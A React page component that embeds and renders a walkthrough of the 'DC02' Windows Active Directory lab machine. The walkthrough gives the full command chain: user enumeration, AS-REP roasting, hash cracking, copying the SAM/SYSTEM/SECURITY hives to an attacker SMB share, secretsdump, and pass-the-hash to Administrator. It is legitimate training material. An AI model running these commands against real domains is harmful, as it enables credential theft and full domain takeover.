import React from 'react';
import { Link } from 'react-router-dom';
import { motion } from 'framer-motion';
import { FaArrowLeft, FaCalendar, FaServer, FaStar, FaDesktop, FaNetworkWired } from 'react-icons/fa';
import TableOfContents from '../../../components/TableOfContents';
import './DC02Walkthrough.css';

const DC02Walkthrough = () => {
  // DC02 Writeup data
  const writeup = {
    id: 'dc02-walkthrough',
    title: 'DC02 Walkthrough',
    date: 'Aug 12, 2025',
    tags: ['hmv', 'windows', 'ad', 'asreproast', 'dcsync', 'backup-operators', 'password-cracking', 'smb', 'ldap'],
    difficulty: 'Medium',
    os: 'Windows',
    ip: '192.168.0.18',
    content: `
# DC02 Walkthrough

## Overview
This Windows Domain Controller (DC01) in the SOUPEDECODE.LOCAL domain was discovered via internal network scanning. Enumeration revealed multiple Active Directory services and valid SMB credentials (charlie:charlie). AS-REP roasting against zximena448 yielded the password internet, granting Backup Operators group privileges. Registry hives (SAM, SYSTEM, SECURITY) were extracted remotely and cracked to obtain administrator-level hashes. Pass-the-Hash via WinRM provided full domain compromise and access to the root flag.

## Enumeration
### Portscanning
Running \`Nmap\` port scanner to enumerate the services running on the target machine. From the nmap scan we have an indication that the target is running a Windows Server with \`Active Directory\` services.
\`\`\`bash
sudo nmap -vv -sS -Pn -n -p- -sV -sC --min-rate=10000 192.168.0.18 -oN nmap/log.nmap

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 128 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 128 Microsoft Windows Kerberos (server time: 2025-03-07 22:09:06Z)
135/tcp   open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 128 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 128 Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 128
464/tcp   open  kpasswd5?     syn-ack ttl 128
593/tcp   open  ncacn_http    syn-ack ttl 128 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 128
3268/tcp  open  ldap          syn-ack ttl 128 Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 128
5985/tcp  open  http          syn-ack ttl 128 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 128 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49682/tcp open  ncacn_http    syn-ack ttl 128 Microsoft Windows RPC over HTTP 1.0
49713/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
MAC Address: 08:00:27:81:BE:9A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:81:be:9a (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
| Names:
|   DC01<00>             Flags: <unique><active>
|   SOUPEDECODE<00>      Flags: <group><active>
|   SOUPEDECODE<1c>      Flags: <group><active>
|   DC01<20>             Flags: <unique><active>
|   SOUPEDECODE<1b>      Flags: <unique><active>
| Statistics:
|   08:00:27:81:be:9a:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 48259/tcp): CLEAN (Timeout)
|   Check 2 (port 7597/tcp): CLEAN (Timeout)
|   Check 3 (port 45162/udp): CLEAN (Timeout)
|   Check 4 (port 59782/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2025-03-07T22:09:54
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 3h59m56s
\`\`\`

Adding the domains into \`hosts\` file.
\`\`\`bash
echo "192.168.0.18 DC01.SOUPEDECODE.LOCAL SOUPEDECODE.LOCAL" | sudo tee -a /etc/hosts
\`\`\`

### Service Enumeration
Running kerbrute to enumerate users.
\`\`\`bash
./kerbrute_linux_amd64 userenum --dc 192.168.0.18 -d SOUPEDECODE.LOCAL /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
\`\`\`

![Kerbrute User Enumeration](/images/writeups/dc02/1.png)

## Foothold
### Exploitation
We can try an username–password pairs line by line using nxc. We will see that \`charlie:charlie\` is a valid pair.
\`\`\`bash
nxc smb 192.168.0.18 -u charlie -p charlie
\`\`\`
![SMB Authentication](/images/writeups/dc02/2.png)

With \`charlie\` credentials, we can access and enumerate the SMB shares.
\`\`\`bash
nxc smb 192.168.0.18 -u charlie -p charlie --shares
\`\`\`
![SMB Shares Enumeration](/images/writeups/dc02/3.png)

Enumerating users from LDAP with nxc.
\`\`\`bash
nxc ldap SOUPEDECODE.LOCAL -u charlie -p charlie --users
\`\`\`
![IPC Share Listing](/images/writeups/dc02/4.png)

Saved the users result on a file. Now we can try to make an AS-REP roast attack using the impacket tool, that will allow us to extract the asrep hash of \`zximena448\`.
\`\`\`bash
impacket-GetNPUsers -dc-ip 192.168.0.18 -request -usersfile users.txt SOUPEDECODE.LOCAL/
\`\`\`
![NETLOGON Share Listing](/images/writeups/dc02/5.png)

Cracking the \`zximena448\` hash with hashcat.
\`\`\`bash
hashcat -m 18200 -a 0 hash /usr/share/wordlists/rockyou.txt
\`\`\`
![SYSVOL Share Listing](/images/writeups/dc02/6.png)

### User Flag
The \`zximena448\` user have READ and WRITE permissions on C$ share folder:
\`\`\`bash
nxc smb SOUPEDECODE.LOCAL -u zximena448 -p i... --shares
\`\`\`
![SYSVOL Domain Listing](/images/writeups/dc02/7.png)

Authenticating as \`zximena448\` user and retrieving the user flag.
\`\`\`bash
smbclient //192.168.0.18/C$ -U 'zximena448'
\`\`\`
![SYSVOL Policies Listing](/images/writeups/dc02/8.png)

## Post-Exploitation
### Privilege Escalation
Dumping domain informations with ldapdomaindump.
\`\`\`bash
sudo ldapdomaindump -u 'SOUPDECODE.LOCAL\\zximena448' -p 'i...' 192.168.0.18
\`\`\`
![SYSVOL Policy Listing](/images/writeups/dc02/9.png)

The \`zximena448\` user it's a member from Backup Operator group.
![SYSVOL Machine Listing](/images/writeups/dc02/10.png)

With that information, we can make a copy from SAM, SYSTEM and SECURITY files. In that case, we can use the \`impacket-reg\` tool:

- Creating a share folder to receive the files:
\`\`\`bash
mkdir -p /tmp/share
chmod 777 /tmp/share
impacket-smbserver share /tmp/share -smb2support
\`\`\`

- Running the \`impacket-reg\` command to copy the files:
\`\`\`bash
impacket-reg SOUPDECODE.LOCAL/zximena448:i...@192.168.0.18 backup -o '\\\\192.168.0.8\\share'
\`\`\`
![SYSVOL Scripts Listing](/images/writeups/dc02/11.png)

With those files, we can use \`impacket-secretsdump\` to extract the hashes.
\`\`\`bash
impacket-secretsdump -sam SAM.save -system SYSTEM.save -security SECURITY.save LOCAL

Administrator:500:aad3b435b51404eeaad3b435b51404ee:209c...:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
\`\`\`
![SYSVOL Startup Listing](/images/writeups/dc02/12.png)

We also can use the \`dc01$\` machine account and make a pass the hash attack to dump all hashes from domain controler.
\`\`\`bash
impacket-secretsdump SOUPEDECODE.LOCAL/'dc01$'@192.168.0.18 -hashes :84204...
\`\`\`
![Backup Script Content](/images/writeups/dc02/13.png)

### Root Flag
We can authenticate as the Administrator making a pass the hash attack:
\`\`\`bash
nxc winrm 192.168.0.18 -u Administrator -H 8982...
\`\`\`
![Administrator Authentication](/images/writeups/dc02/14.png)

Authenticating as Administrator and retrieving the root flag.
\`\`\`bash
evil-winrm -i 192.168.0.18 -u Administrator -H 8982...
\`\`\`
![Root Flag Retrieval](/images/writeups/dc02/17.png)
    `
  };

  return (
    <motion.div 
      className="writeup-detail-page"
      initial={{ opacity: 0, y: 20 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.6 }}
    >
      <div className="writeup-header">
        <Link to="/writeups" className="back-button">
          <FaArrowLeft />
          <span>Back to Writeups</span>
        </Link>
        
        <motion.div 
          className="writeup-title-section"
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.2, duration: 0.6 }}
        >
          <h1>{writeup.title}</h1>
          
          <div className="writeup-meta">
            <div className="meta-item">
              <FaCalendar />
              <span>{writeup.date}</span>
            </div>
          </div>

          <div className="writeup-tags">
            {writeup.tags.map((tag, index) => (
              <motion.span
                key={tag}
                className="tag-badge"
                initial={{ scale: 0, opacity: 0 }}
                animate={{ scale: 1, opacity: 1 }}
                transition={{ delay: 0.3 + index * 0.1, duration: 0.3 }}
                whileHover={{ scale: 1.1 }}
                style={{ cursor: 'pointer' }}
                onClick={() => window.location.href = `/tags/${tag}`}
              >
                {tag}
              </motion.span>
            ))}
          </div>

          <div className="machine-info">
            <div className="machine-info-content">
              <div className="machine-info-left">
                <h6><FaServer /> Machine Information:</h6>
                <div className="machine-info-vertical">
                  <div className="info-item">
                    <FaDesktop /> OS: 
                    <img 
                      src={`/os-icons/${writeup.os}.png`} 
                      alt={`${writeup.os} Icon`} 
                      className="os-icon"
                      onError={(e) => {
                        e.target.style.display = 'none';
                        e.target.nextSibling.style.display = 'inline';
                      }}
                    />
                  </div>
                  <div className="info-item">
                    <FaStar /> Difficulty: {writeup.difficulty}
                  </div>
                  <div className="info-item">
                    <FaNetworkWired /> IP: {writeup.ip}
                  </div>
                </div>
              </div>
              <div className="machine-info-right">
                <img src="/images/writeups/dc02-machine.png" alt="DC02 Machine" className="machine-image" />
              </div>
            </div>
          </div>
        </motion.div>
      </div>

      <div className="writeup-layout">
        <motion.div 
          className="writeup-content"
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.4, duration: 0.6 }}
        >
          <div className="markdown-content">
            {(() => {
              const lines = writeup.content.split('\n');
              const elements = [];
              let i = 0;
              
              while (i < lines.length) {
                const line = lines[i];
                
                if (line.startsWith('# ')) {
                  elements.push(<h1 key={i}>{line.substring(2)}</h1>);
                } else if (line.startsWith('## ')) {
                  elements.push(<h2 key={i}>{line.substring(3)}</h2>);
                } else if (line.startsWith('### ')) {
                  elements.push(<h3 key={i}>{line.substring(4)}</h3>);
                } else if (line.startsWith('```')) {
                  // Handle code blocks
                  const language = line.substring(3).trim();
                  const codeLines = [];
                  i++;
                  
                  while (i < lines.length && !lines[i].startsWith('```')) {
                    codeLines.push(lines[i]);
                    i++;
                  }
                  
                  elements.push(
                    <pre key={i} className="code-block">
                      <code className={`language-${language}`}>
                        {codeLines.join('\n')}
                      </code>
                    </pre>
                  );
                } else if (line.startsWith('![') && line.includes('](') && line.endsWith(')')) {
                  const altText = line.match(/\[(.*?)\]/)[1];
                  const imageSrc = line.match(/\((.*?)\)/)[1];
                  elements.push(
                    <div key={i} className="image-container">
                      <img src={imageSrc} alt={altText} className="content-image" />
                    </div>
                  );
                } else if (line.trim() === '') {
                  elements.push(<br key={i} />);
                } else {
                  // Process inline markdown
                  const processedLine = line
                    .replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>') // Bold
                    .replace(/\*(.*?)\*/g, '<em>$1</em>') // Italic
                    .replace(/`(.*?)`/g, '<code class="inline-code">$1</code>'); // Inline code
                  
                  elements.push(
                    <p key={i} dangerouslySetInnerHTML={{ __html: processedLine }} />
                  );
                }
                
                i++;
              }
              
              return elements;
            })()}
          </div>
        </motion.div>
        <TableOfContents content={writeup.content} />
      </div>
    </motion.div>
  );
};

export default DC02Walkthrough;
